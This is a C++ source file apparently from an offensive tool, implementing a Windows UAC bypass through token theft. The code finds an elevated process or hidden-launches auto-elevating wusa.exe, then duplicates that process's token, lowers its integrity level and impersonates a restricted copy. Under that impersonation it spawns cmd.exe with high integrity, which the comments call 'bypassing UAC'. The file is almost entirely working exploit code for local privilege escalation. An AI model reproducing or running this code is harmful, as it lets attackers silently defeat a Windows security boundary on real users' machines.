#include "stdafx.h"
#include "token_manipulation.hpp"
#include "ntdll.hpp"

/*
 * Thanks: CIA :)
 * https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-1.html
 * https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-2.html
 * https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-3.html
 */

bool token_manipulation::run()
{
	std::cout << "[+] Token Manipulation" << std::endl;

	// FIRST WE SEARCH FOR ANY RUNNING ELEVATED APP IN SAME SECTION
	HANDLE process_handle = token_manipulation::find_elevated_process();

	auto created_process = false;
	if (process_handle == NULL) // NO ELEVATED PROCESSES FOUND - TRIGGER ALWAYS_NOTIFY :'(
		created_process = token_manipulation::launch_auto_elevating_app(&process_handle);

	std::cout << "[+] Process Handle: " << std::hex << reinterpret_cast<uint32_t>(process_handle) << std::dec << std::endl;
	std::cout << "[+] Process Id: " << GetProcessId(process_handle) << std::endl;

	// OPEN ELEVATED PROCESS' TOKEN
	HANDLE token_handle;
	auto status = ntdll::NtOpenProcessToken(process_handle, MAXIMUM_ALLOWED, &token_handle);

	if (!NT_SUCCESS(status))
	{
		std::cout << "[!] NtOpenProcessToken failed" << std::endl;
		return false;
	}

	std::cout << "[+] Token Handle: " << std::hex << reinterpret_cast<uint32_t>(token_handle) << std::dec << std::endl;

	// DUPLICATE TOKEN WITH TOKEN_ALL_ACCESS
	auto dup_token_handle = duplicate_token(token_handle, TOKEN_ALL_ACCESS, TokenPrimary);

	// CLOSE PREVIOUS, SHITTY HANDLE
	CloseHandle(token_handle); 

	std::cout << "[+] Duplicated Token Handle: " << std::hex << reinterpret_cast<uint32_t>(dup_token_handle) << std::dec << std::endl;

	// LOWER TOKEN IL FROM HIGH -> MEDIUM
	if (!token_manipulation::lower_token_il(dup_token_handle))
	{
		std::cout << "[!] lower_token_il failed" << std::endl;
		return false;
	}

	// CREATE RESTRICTED TOKEN
	auto restricted_token_handle = token_manipulation::create_restricted_token(dup_token_handle);

	// CLOSE DUPLICATED TOKEN HANDLE, WE WON'T NEED IT ANYMORE
	CloseHandle(dup_token_handle);

	// IMPERSONATE USING RESTRICTED TOKEN
	if (!token_manipulation::impersonate_user(restricted_token_handle))
	{
		std::cout << "[!] impersonate_user failed" << std::endl;
		return false;
	}

	// CLOSE RESTRICTED TOKEN HANDLE, WE WON'T NEED IT ANYMORE
	CloseHandle(restricted_token_handle);

	// LAUNCH PAYLOAD WITH HIGH IL, BYPASSING UAC
	if (!token_manipulation::launch_payload())
	{
		std::cout << "[!] launch_payload failed" << std::endl;
		return false;
	}

	// REVERT IMPERSONATION AS THIS TOKEN HAS RESTRICTIONS
	if (!token_manipulation::revert_impersonation())
	{
		std::cout << "[!] revert_impersonation failed" << std::endl;
		return false;
	}

	// IF CREATED, TERMINATE AUTO-ELEVATING PROCESS
	if (created_process)
		TerminateProcess(process_handle, 1);

	// CLOSE PROCESS HANDLE
	CloseHandle(process_handle);

	return true;
}

HANDLE token_manipulation::find_elevated_process()
{
	// ENUMERATE PROCESSES TO FIND AN ALREADY ELEVATED PROCESS
	// TO STEAL ITS TOKEN

	DWORD process_list[256], bytes_needed;
	if (EnumProcesses(process_list, sizeof(process_list), &bytes_needed))
	{
		auto amount = bytes_needed / sizeof(DWORD);
		for (size_t index = 0; index < amount; index++)
		{
			auto handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, process_list[index]);

			if (token_manipulation::is_process_admin(handle))
				return handle;

			CloseHandle(handle);

		}
	}

	return NULL;
}
HANDLE token_manipulation::duplicate_token(HANDLE token_handle, ACCESS_MASK desired_access, _TOKEN_TYPE token_type)
{
	SECURITY_QUALITY_OF_SERVICE sqos;
	OBJECT_ATTRIBUTES obja;
	HANDLE dup_token_handle;
	sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
	sqos.ImpersonationLevel = SecurityImpersonation;
	sqos.ContextTrackingMode = NULL;
	sqos.EffectiveOnly = false;
	InitializeObjectAttributes(&obja, NULL, NULL, NULL, NULL);
	obja.SecurityQualityOfService = &sqos;

	auto status = ntdll::NtDuplicateToken(token_handle, desired_access, &obja, false, token_type, &dup_token_handle);
	return dup_token_handle;
}
HANDLE token_manipulation::create_restricted_token(HANDLE token_handle)
{
	HANDLE restricted_token_handle;

	ntdll::NtFilterToken(token_handle, LUA_TOKEN, NULL, NULL, NULL, &restricted_token_handle);

	return restricted_token_handle;
}

bool token_manipulation::is_process_admin(HANDLE process)
{
	HANDLE token_handle;
	OpenProcessToken(process, TOKEN_READ, &token_handle);

	_TOKEN_ELEVATION_TYPE result;
	DWORD bytes_read;
	GetTokenInformation(token_handle, TokenElevationType, &result, sizeof(_TOKEN_ELEVATION_TYPE), &bytes_read);

	CloseHandle(token_handle);

	return result == TokenElevationTypeFull;
}
bool token_manipulation::lower_token_il(HANDLE token_handle)
{
	SID_IDENTIFIER_AUTHORITY authority = SECURITY_MANDATORY_LABEL_AUTHORITY;
	PSID integrity_sid = nullptr;
	auto status = ntdll::RtlAllocateAndInitializeSid(&authority,1, SECURITY_MANDATORY_MEDIUM_RID, NULL, NULL, NULL, NULL, NULL, NULL, NULL, &integrity_sid);

	if (!NT_SUCCESS(status))
	{
		std::cout << "[!] RtlAllocateAndInitializeSid failed" << std::endl;
		return false;
	}

	TOKEN_MANDATORY_LABEL token_label;

	token_label.Label.Attributes = SE_GROUP_INTEGRITY;
	token_label.Label.Sid = integrity_sid;

	status = ntdll::NtSetInformationToken(token_handle, TokenIntegrityLevel, &token_label,
		static_cast<ULONG>((sizeof(TOKEN_MANDATORY_LABEL) + ntdll::RtlLengthSid(integrity_sid))));

	return NT_SUCCESS(status);
}
bool token_manipulation::launch_auto_elevating_app(HANDLE* process_handle)
{
	// RUN ELEVATED APP
	SHELLEXECUTEINFOW shinfo;

	shinfo.cbSize = sizeof(shinfo);
	shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	shinfo.nShow = SW_HIDE;
	shinfo.lpFile = L"C:\\Windows\\System32\\wusa.exe";

	if (!ShellExecuteExW(&shinfo))
	{
		std::cout << "[!] ShellExecuteEx failed" << std::endl;
		return false;
	}
	*process_handle = shinfo.hProcess;

	return true;
}
bool token_manipulation::impersonate_user(HANDLE token_handle)
{
	auto imp_token_handle = token_manipulation::duplicate_token(token_handle, TOKEN_IMPERSONATE | TOKEN_QUERY, TokenImpersonation);

	if (imp_token_handle == NULL)
		return false;

	ntdll::NtSetInformationThread(
		CurrentThread,
		static_cast<THREADINFOCLASS>(5), //ThreadImpersonationToken
		&imp_token_handle,
		sizeof(HANDLE));

	return imp_token_handle;
}
bool token_manipulation::revert_impersonation()
{
	// REVERT TO SELF
	auto imp_token_handle = NULL;
	auto status = ntdll::NtSetInformationThread(
		CurrentThread,
		static_cast<THREADINFOCLASS>(5), //ThreadImpersonationToken
		&imp_token_handle,
		sizeof(HANDLE));

	return NT_SUCCESS(status);
}
bool token_manipulation::launch_payload()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	si.cb = sizeof(si);
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;

	auto result = CreateProcessWithLogonW(TEXT("."), TEXT("."), TEXT("."),
		LOGON_NETCREDENTIALS_ONLY,
		L"C:\\Windows\\System32\\cmd.exe",
		NULL, 0, NULL, nullptr,
		&si, &pi);

	return result;
}
